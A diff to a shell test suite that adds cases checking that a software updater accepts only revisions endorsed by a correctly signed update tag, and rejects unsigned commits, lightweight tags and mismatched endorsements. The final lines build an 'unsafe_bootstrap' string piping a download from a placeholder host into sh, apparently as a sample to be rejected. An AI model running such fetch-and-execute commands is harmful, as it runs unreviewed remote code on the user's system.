@@ -406,6 +406,9 @@ run_unsigned_candidate_rejected() {
     fixture_git -C "$AUTHOR" add unsigned.txt
     fixture_git -c commit.gpgsign=false -C "$AUTHOR" \
         commit -qm 'unsigned candidate revision'
+    if (cd -- "$AUTHOR" && "$REPO_ROOT/scripts/verify-update-tip.sh" "$CURRENT_COMMIT" HEAD); then
+        fail 'the publication check accepted an unsigned tip'
+    fi
     fixture_git -C "$AUTHOR" push -q origin main
     CANDIDATE_COMMIT=$(fixture_git -C "$AUTHOR" rev-parse HEAD)
     begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
@@ -416,6 +419,72 @@ run_unsigned_candidate_rejected() {
     assert_no_candidate_execution "$TX_DIR"
     assert_head "$ACTIVE" "$CURRENT_COMMIT" \
         'unsigned candidate rejection changed active HEAD'
+}
+
+run_publication_requires_signed_tag() {
+    local update_tag
+    reset_transaction_context
+    setup_fixture publication-requires-tag
+    update_tag="myhypr-update/$CANDIDATE_COMMIT"
+
+    if (cd -- "$AUTHOR" && "$REPO_ROOT/scripts/verify-update-tip.sh" "$CURRENT_COMMIT" HEAD); then
+        fail 'the publication check accepted a signed commit without an update tag'
+    fi
+
+    fixture_git -C "$AUTHOR" tag --no-sign "$update_tag" "$CANDIDATE_COMMIT"
+    if (cd -- "$AUTHOR" && "$REPO_ROOT/scripts/verify-update-tip.sh" "$CURRENT_COMMIT" HEAD); then
+        fail 'the publication check accepted a lightweight tag on a signed commit'
+    fi
+}
+
+run_update_endorsement() {
+    local update_tag other_tag_object
+    reset_transaction_context
+    setup_fixture tagged-merge
+
+    fixture_git -C "$AUTHOR" switch -qc topic
+    printf 'reviewed\n' > "$AUTHOR/reviewed.txt"
+    fixture_git -C "$AUTHOR" add reviewed.txt
+    fixture_git -C "$AUTHOR" commit -qm 'reviewed PR revision'
+    fixture_git -C "$AUTHOR" switch -q main
+    fixture_git -c commit.gpgsign=false -C "$AUTHOR" merge -q --no-ff --no-edit topic
+    fixture_git -C "$AUTHOR" push -q origin main
+    CANDIDATE_COMMIT=$(fixture_git -C "$AUTHOR" rev-parse HEAD)
+    update_tag="myhypr-update/$CANDIDATE_COMMIT"
+
+    fixture_git -C "$AUTHOR" tag -s -m 'Endorse the wrong revision' "$update_tag" "$CURRENT_COMMIT"
+    fixture_git -C "$AUTHOR" push -q origin "refs/tags/$update_tag"
+    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
+
+    if maintenance_git_prepare "$TX_DIR" "$ACTIVE"; then
+        fail 'the updater accepted an endorsement for a different object'
+    fi
+    assert_no_candidate_execution "$TX_DIR"
+    assert_head "$ACTIVE" "$CURRENT_COMMIT" 'a rejected endorsement changed active HEAD'
+
+    fixture_git -C "$AUTHOR" tag -s -m 'Record the reviewed merge' reviewed-merge "$CANDIDATE_COMMIT"
+    other_tag_object=$(fixture_git -C "$AUTHOR" rev-parse refs/tags/reviewed-merge)
+    fixture_git -C "$AUTHOR" update-ref "refs/tags/$update_tag" "$other_tag_object"
+    fixture_git -C "$AUTHOR" push -q origin "+refs/tags/$update_tag"
+    if (cd -- "$AUTHOR" && "$REPO_ROOT/scripts/verify-update-tip.sh" "$CURRENT_COMMIT" HEAD); then
+        fail 'the publication check accepted a tag with a different signed name'
+    fi
+    if maintenance_git_prepare "$TX_DIR" "$ACTIVE"; then
+        fail 'the updater accepted a tag with a different signed name'
+    fi
+    assert_no_candidate_execution "$TX_DIR"
+    assert_head "$ACTIVE" "$CURRENT_COMMIT" 'a rejected endorsement changed active HEAD'
+
+    fixture_git -C "$AUTHOR" tag -fs -m 'Endorse the reviewed merge' "$update_tag" "$CANDIDATE_COMMIT" >/dev/null
+    fixture_git -C "$AUTHOR" push -q origin "+refs/tags/$update_tag"
+    (cd -- "$AUTHOR" && "$REPO_ROOT/scripts/verify-update-tip.sh" "$CURRENT_COMMIT" HEAD) || \
+        fail 'the publication check rejected an SSH-endorsed merge'
+    maintenance_git_prepare "$TX_DIR" "$ACTIVE" || fail 'the updater rejected an SSH-endorsed merge'
+    assert_head "$TX_DIR/candidate" "$CANDIDATE_COMMIT" 'the wrong endorsed revision was prepared'
+    if fixture_git -C "$ACTIVE" show-ref --verify --quiet "refs/tags/$update_tag"; then
+        fail 'fetching an update endorsement installed a local tag'
+    fi
+    maintenance_git_cleanup "$TX_DIR" "$ACTIVE" || fail 'endorsed candidate cleanup failed'
 }
 
 run_scan_rejection() {
@@ -644,6 +713,8 @@ run_candidate_failure fail-audit 43 null
 run_candidate_failure fail-check 0 42
 run_candidate_timeout
 run_unsigned_candidate_rejected
+run_publication_requires_signed_tag
+run_update_endorsement
 
 unsafe_bootstrap='curl https://example.invalid/bootstrap'
 unsafe_bootstrap+=' | sh'
